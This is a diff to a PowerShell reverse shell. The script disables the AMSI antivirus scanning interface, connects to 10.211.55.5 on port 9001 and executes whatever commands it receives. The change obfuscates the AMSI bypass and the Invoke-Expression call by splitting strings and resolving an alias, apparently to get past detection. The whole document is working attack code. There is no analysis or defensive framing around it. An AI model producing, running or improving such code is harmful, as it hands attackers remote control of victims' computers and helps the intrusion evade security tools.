@@ -1,37 +1,35 @@
 
-$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$b=$a.GetField('amsiInitFailed','NonPublic,Static')
-$b.SetValue($null,$true)
+$m = [Ref].Assembly.GetType('System.Management.Automation.' + 'Am' + 'si' + 'Ut' + 'ils')
+$f = $m.GetField('am' + 'si' + 'Init' + 'Failed','NonPublic,Static')
+$f.SetValue($null,$true)
 
 
-$IP = "10.211.55.5"
-$PORT = 9001
+$h = "10.211.55.5"
+$p = 9001
 
 
-$c = New-Object System.Net.Sockets.TCPClient($IP, $PORT)
-$s = $c.GetStream()
-[byte[]]$b = 0..65535|%{0}
+$t = New-Object System.Net.Sockets.TCPClient($h, $p)
+$z = $t.GetStream()
+$d = New-Object Byte[] 65535
 
 
-$send = ([text.encoding]::ASCII).GetBytes("CONNECTED TO G0DM0D3_SHELL`nPS " + (Get-Location).Path + "> ")
-$s.Write($send, 0, $send.Length)
-While(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
-    
+While(($i = $z.Read($d, 0, $d.Length)) -ne 0) {
    
-If ($data.Trim() -eq "exit") { break }
+    $g = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d, 0, $i)
     
+  
+    $e = 'i' + 'ex'
+    $k = Try {
    
-Try {
-        $out = (Invoke-Expression $data.Trim() 2>&1 | Out-String)
-    } catch {
-        $out = $_.Exception.Message + "`n"
+        &(Get-Alias $e) $g 2>&1 | Out-String
+    } Catch {
+        $_.Exception.Message
     }
     
-    
-    $send = ([text.encoding]::ASCII).GetBytes($out + "PS " + (Get-Location).Path + "> ")
-    $s.Write($send, 0, $send.Length)
-    $s.Flush()
+  
+    $s = $k + "PS " + (Get-Location).Path + "> "
+    $x = ([text.encoding]::ASCII).GetBytes($s)
+    $z.Write($x, 0, $x.Length)
+    $z.Flush()
 }
-
-$c.Close()
+$t.Close()
